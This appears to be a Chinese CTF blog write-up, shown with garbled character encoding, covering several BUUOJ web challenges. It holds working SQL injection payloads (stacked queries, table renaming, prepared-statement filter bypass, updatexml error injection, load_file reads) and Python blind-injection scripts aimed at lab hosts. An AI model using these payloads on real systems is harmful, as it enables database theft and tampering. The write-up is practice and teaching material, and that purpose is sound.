<p>é¢˜ç›®é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p>
<p>è€ƒå¯Ÿï¼šå †å æ³¨å…¥ï¼Œsqlçš„showè¯­å¥ï¼Œsqlçš„é¢„ç¼–è¯‘ï¼Œsqlä¿®æ”¹è¡¨</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chalan630/p/12583667.html%EF%BC%8Chttps://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/">https://www.cnblogs.com/chalan630/p/12583667.htmlï¼Œhttps://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/</a></p>
<p>æµ‹è¯•è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p>èƒ½å¤Ÿå¾—å‡ºè¾“å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>
<p>æ—¶ä¸€æ ·çš„å›æ˜¾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1&#39;   			# æŠ¥é”™</span><br><span class="line">1&#39;--+  			# æ­£å¸¸ä¸”ä¸ºTrue</span><br><span class="line">1&#39; and 1&#x3D;1 --+  # æ­£å¸¸ä¸”ä¸ºTrue</span><br><span class="line">1&#39; and 1&#x3D;2 --+  # æ­£å¸¸ä¸”ä¸ºFalse</span><br><span class="line">?inject&#x3D;1&#39; order by 3--+ # error 1054 : Unknown column &#39;3&#39; in &#39;order clause&#39;</span><br><span class="line">inject&#x3D;1&#39;; show tables; --+ $ # 1919810931114514 words</span><br><span class="line">?inject&#x3D;1&#39;; show columns from words; --+ # </span><br><span class="line">show columns from &#96;1919810931114514&#96;;--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">words &#123;</span><br><span class="line">id int(10);</span><br><span class="line">data varchar(20);</span><br><span class="line">&#125;</span><br><span class="line">1919810931114514&#123;</span><br><span class="line">flag varchar(100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload1ï¼šä¿®æ”¹è¡¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;; rename table &#96;words&#96; to &#96;words1&#96;; rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; VARCHAR(100) character set utf8 collate utf8_general_ci not null;--+</span><br></pre></td></tr></table></figure>
<p>payload2ï¼šé¢„ç¼–è¯‘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;Set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);Prepare s from @a; execute s; --+</span><br></pre></td></tr></table></figure>
<p>flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;34745aea-2541-43e6-884f-c67988afc34a&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sqlæ­£å¸¸æ³¨å…¥æµç¨‹"><a href="#sqlæ­£å¸¸æ³¨å…¥æµç¨‹" class="headerlink" title="sqlæ­£å¸¸æ³¨å…¥æµç¨‹"></a>sqlæ­£å¸¸æ³¨å…¥æµç¨‹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 # æ­£å¸¸è¾“å…¥</span><br><span class="line">1&#39; # è‹¥æŠ¥é”™ï¼Œåˆ™å•å¼•å·ä¸ºå¯èƒ½çš„æ³¨å…¥ç‚¹</span><br><span class="line">1&#39; --+ # åˆ¤æ–­æ³¨å…¥ç±»å‹</span><br><span class="line">1&#39; and 1&#x3D;1 --+ # åˆ¤æ–­æ³¨å…¥ç±»å‹</span><br><span class="line">1&#39; and 1&#x3D;2 --+ # åˆ¤æ–­æ³¨å…¥ç±»å‹</span><br><span class="line"></span><br><span class="line">1&#39; order by 3 --+ # åˆ¤æ–­åˆ—æ•°</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="sqlçš„showå‘½ä»¤"><a href="#sqlçš„showå‘½ä»¤" class="headerlink" title="sqlçš„showå‘½ä»¤"></a>sqlçš„showå‘½ä»¤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show table from db_name;</span><br><span class="line">show engine;</span><br><span class="line">show character set; #æ˜¾ç¤ºæ”¯æŒå“ªäº›å­—ç¬¦é›†</span><br><span class="line">show columns;</span><br><span class="line">show create databases; #æ˜¾ç¤ºå·²ç»åˆ›å»ºçš„åº“ï¼Œåˆ›å»ºæ—¶çš„è¯­å¥</span><br><span class="line">show create table; #æ˜¾ç¤ºå·²ç»åˆ›å»ºçš„è¡¨ï¼Œåˆ›å»ºæ—¶çš„è¯­å¥</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="sqlå †å æ³¨å…¥"><a href="#sqlå †å æ³¨å…¥" class="headerlink" title="sqlå †å æ³¨å…¥"></a>sqlå †å æ³¨å…¥</h2><p>æ·»åŠ åˆ†å·;å³å¯å®ç°åŒä¸€è¡Œæ‰§è¡Œå¤šä¸ªsqlè¯­å¥</p>
<h2 id="sqlä¿®æ”¹è¡¨"><a href="#sqlä¿®æ”¹è¡¨" class="headerlink" title="sqlä¿®æ”¹è¡¨"></a>sqlä¿®æ”¹è¡¨</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename table &#96;words&#96; to &#96;test&#96;;</span><br><span class="line">rename table &#96;1919810931114514&#96; to &#96;words&#96;;</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);</span><br></pre></td></tr></table></figure>
<h2 id="sqlé¢„ç¼–è¯‘"><a href="#sqlé¢„ç¼–è¯‘" class="headerlink" title="sqlé¢„ç¼–è¯‘"></a>sqlé¢„ç¼–è¯‘</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SET;									# ç”¨äºè®¾ç½®å˜é‡åå’Œå€¼</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;	# ç”¨äºé¢„å¤‡ä¸€ä¸ªè¯­å¥ï¼Œå¹¶èµ‹äºˆåç§°ï¼Œä»¥åå¯ä»¥å¼•ç”¨è¯¥è¯­å¥</span><br><span class="line">EXECUTE stmt_name;			 			# æ‰§è¡Œè¯­å¥</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;	# ç”¨æ¥é‡Šæ”¾æ‰é¢„å¤„ç†çš„è¯­å¥</span><br><span class="line"></span><br><span class="line">å®ä¾‹</span><br><span class="line">set @sql&#x3D;CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);</span><br><span class="line">prepare stmt from @sql;</span><br><span class="line">execute stmt;</span><br></pre></td></tr></table></figure>
<h1 id="hack-world"><a href="#hack-world" class="headerlink" title="hack world"></a>hack world</h1><p>æ¥æºï¼š[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]</p>
<p>é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World</a></p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-Hack-world">https://ca01h.top/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/#CISCN2019-Hack-world</a></p>
<p>è€ƒå¯Ÿï¼šboolç›²æ³¨</p>
<p>çœ‹åˆ°payloadæƒ³éª‚è„è¯</p>
<p>å°è¯•å¸¸è§„è¾“å…¥ï¼Œ1å’Œ2å¯ä»¥ï¼Œä¹‹åéƒ½ä¸è¡Œ</p>
<p>å°è¯•å¸¸è§„çš„æ³¨å…¥ï¼Œåªæœ‰å•å¼•å·æ—¶ä¼šè¿”å›bool(false)ï¼Œåº”è¯¥æç¤ºboolå‹ç›²æ³¨å§</p>
<p>payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;),1,2)</span><br></pre></td></tr></table></figure>
<p>ç”±äº1å’Œ2è¾“å‡ºä¸åŒï¼Œæ ¹æ®è¿™ä¸ªè¿›è¡Œæ³¨å…¥å³å¯</p>
<p><strong>å¯ä»¥é€šè¿‡ä¸€ä¸ªå­—å…¸ï¼Œè§‚å¯Ÿå“ªäº›å­—ç¬¦è¢«wafè¿‡æ»¤</strong></p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://a9e8a73f-f3d4-4ee4-a165-78c21730f40d.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">text1 = <span class="string">&quot;Hello, glzjin wants a girlfriend.&quot;</span></span><br><span class="line">text2 = <span class="string">&quot;Do you want to be my girlfriend?&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">	<span class="comment"># print(&quot;debug&quot;)</span></span><br><span class="line">	flag = <span class="literal">False</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">		c = <span class="built_in">chr</span>(j)</span><br><span class="line">		<span class="comment"># print(c)</span></span><br><span class="line">		s = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>, j) <span class="comment">#æ³¨æ„æ­¤å¤„å¿…é¡»è½¬æˆasciiç åˆ¤æ–­ï¼Œå› ä¸ºsqlä¸­ä¸åŒºåˆ†å¤§å°å†™ï¼Œç›´æ¥åˆ¤æ–­å­—ç¬¦ä¼šæœ‰åŒå¼•å·å•å¼•å·å¤§å°å†™ç­‰é—®é¢˜</span></span><br><span class="line">		post_data = &#123;</span><br><span class="line">			<span class="string">&quot;id&quot;</span>: s</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment"># print(s)</span></span><br><span class="line">		response = requests.post(url, post_data)</span><br><span class="line">		<span class="keyword">if</span> text1 <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">			ans += c</span><br><span class="line">			print(c)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if(substr(select(flag)from(flag),&#123;&#125;,1)=&#123;&#125;,1,2)</span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªè„šæœ¬æ¯”è¾ƒæ…¢ï¼Œæé«˜æ•ˆç‡çš„æ–¹æ³•æœ‰ä¸¤ä¸ªã€‚ä¸€ä¸ªæ˜¯è½¬æ¢æˆasciiç æŸ¥æ‰¾ï¼ˆæœ¬é¢˜è¿‡æ»¤äº†ordï¼Œå› æ­¤åªèƒ½ç”¨asciiè¿›è¡Œè½¬ç ï¼‰ï¼Œä¸€ä¸ªæ˜¯rangeä¸‹é™è®¾ç½®ä¸º32ï¼ˆâ€™aâ€™ä»32å¼€å§‹ï¼‰</p>
<p>wpæä¾›äº†ä¸€ä¸ªäºŒåˆ†è„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;a9475c38-821c-4b23-aa96-87730f0863fe.node3.buuoj.cn&#x2F;index.php&#39;</span><br><span class="line">flag &#x3D; &#39;Hello, glzjin wants a girlfriend.&#39;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    sleep(1)</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),&#123;index&#125;,1))&gt;&#123;char&#125;,1,2)&quot;.format(index&#x3D;i, char&#x3D;mid)</span><br><span class="line">        data &#x3D; &#123;&#39;id&#39;: payload&#125;</span><br><span class="line">        response &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">        if flag in response.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">    result +&#x3D; chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<h1 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h1><p>é¢˜ç›®æ¥æºï¼š[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]</p>
<p>é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk</a></p>
<p>è€ƒå¯Ÿï¼šphpä¼ªåè®®ï¼ŒxpathæŠ¥é”™æ³¨å…¥ï¼Œload_file</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12318551.html">https://www.cnblogs.com/wangtanzhi/p/12318551.html</a></p>
<p><strong>ç¬¬ä¸€æ­¥</strong></p>
<p>é¦–å…ˆè¿›å…¥é¡µé¢ï¼Œindexç•Œé¢å¯ä»¥ç”¨getçš„æ–¹å¼æäº¤fileå‚æ•°ï¼Œå³å¯ä½¿ç”¨phpä¼ªåè®®ç›´æ¥è¯»å–æºç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>
<p><strong>ç¬¬äºŒæ­¥</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   &#x2F;&#x2F;index.php</span><br><span class="line"></span><br><span class="line">ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; $file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$file &#x3D; (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);</span><br><span class="line">if (isset($file))&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;phar|zip|bzip2|zlib|data|input|%00&#x2F;i&quot;,$file)) &#123;</span><br><span class="line">        echo(&#39;no way!&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    @include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  &#x2F;&#x2F;change.php</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address &#x3D; addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];</span><br><span class="line">        $result &#x3D; $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;Ã¨Â®Â¢Ã¥ÂÂ•Ã¤</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  &#x2F;&#x2F;search.php</span><br><span class="line">require_once &quot;config.php&quot;; </span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg &#x3D; &#39;&#39;;</span><br><span class="line">    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;</span><br><span class="line">    $user_name &#x3D; $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone &#x3D; $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg &#x3D; &#39;no sql inject!&#39;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;</span><br><span class="line">        $fetch &#x3D; $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row &#x3D; $fetch-&gt;fetch_assoc();</span><br><span class="line">        if(!$row) &#123;</span><br><span class="line">            echo &#39;error&#39;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg &#x3D; &quot;&lt;p&gt;Ã¥Â§Â“Ã¥ÂÂ:&quot;.$row[&#39;user_name&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, Ã§Â”ÂµÃ¨Â¯Â:&quot;.$row[&#39;phone&#39;].&quot;&lt;&#x2F;p&gt;&lt;p&gt;, Ã¥ÂœÂ°Ã¥ÂÂ€:&quot;.$row[&#39;address&#39;].&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg &#x3D; &quot;Ã¦ÂœÂªÃ¦Â‰Â¾Ã¥ÂˆÂ°Ã¨Â®Â¢Ã¥ÂÂ•!&quot;;</span><br></pre></td></tr></table></figure>
<p>å‘ç°åœ¨3ä¸ªphpä¸­ï¼Œéƒ½å¯¹user_nameå’Œpatternè¿›è¡Œäº†è¿‡æ»¤ï¼Œå› æ­¤åªèƒ½åœ¨addressä¸Šè¿›è¡Œæ³¨å…¥ã€‚</p>
<p>åˆæ³¨æ„åˆ°ï¼Œåªåœ¨change.phpä¸­å¯¹addressæ‰§è¡Œäº†sqlè¯­å¥ï¼Œè€Œåœ¨search.phpä¸­ï¼Œåªæ˜¯ä»æ•°æ®åº“ä¸­è¿”å›äº†addressçš„å€¼ã€‚æ•…è¿™æ˜¯ä¸€ä¸ªäºŒæ¬¡æ³¨å…¥ï¼Œæ•…æ“ä½œåœ¨index.phpå’Œchange.phpä¸­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;æ•°æ®åº“</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(database(),1,20)),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;è¡¨å</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(table_name,1,20)from information_schema.tables where table_schema&#x3D;&#39;ctfusers&#39;),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;å­—æ®µ</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,20)from information_schema.columns where table_name&#x3D;&#39;user&#39;),0x7e),1)#</span><br><span class="line">&#x2F;&#x2F;æ•°æ®</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),20,50)),0x7e),1)#</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;05e89701-1f01-4719-965c-3d59d7e0f664&#125;</span><br></pre></td></tr></table></figure>
<h2 id="xpathæŠ¥é”™æ³¨å…¥"><a href="#xpathæŠ¥é”™æ³¨å…¥" class="headerlink" title="xpathæŠ¥é”™æ³¨å…¥"></a>xpathæŠ¥é”™æ³¨å…¥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,SUBSTR((SELECT f14g from f14g LIMIT 0,1),1,24),0x7e),1) # æœ€å¤šæ˜¾ç¤º32ä½ï¼Œéœ€è¦é…åˆsubsträ½¿ç”¨</span><br></pre></td></tr></table></figure>
<h2 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php # ä»¥base64æ–¹å¼è¯»å–æŒ‡å®šé¡µé¢æºç </span><br></pre></td></tr></table></figure>
<h1 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>æ¥æºï¼šSUCTF2019</p>
<p>è€ƒå¯Ÿï¼šå †å æ³¨å…¥ï¼Œsql_mode</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://baynk.blog.csdn.net/article/details/105241226%EF%BC%8Chttps://my.oschina.net/u/4413091/blog/3384385">https://baynk.blog.csdn.net/article/details/105241226ï¼Œhttps://my.oschina.net/u/4413091/blog/3384385</a></p>
<p><strong>ç¬¬ä¸€æ­¥</strong></p>
<p>å…ˆç”¨fuzzå­—å…¸è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°å¤§éƒ¨åˆ†å…³é”®å­—è¢«è¿‡æ»¤ï¼ˆselectï¼Œandï¼ŒåŒå¼•å·ç­‰ï¼‰</p>
<p>ä½†æ˜¯åˆ†å·;æ²¡è¿‡æ»¤</p>
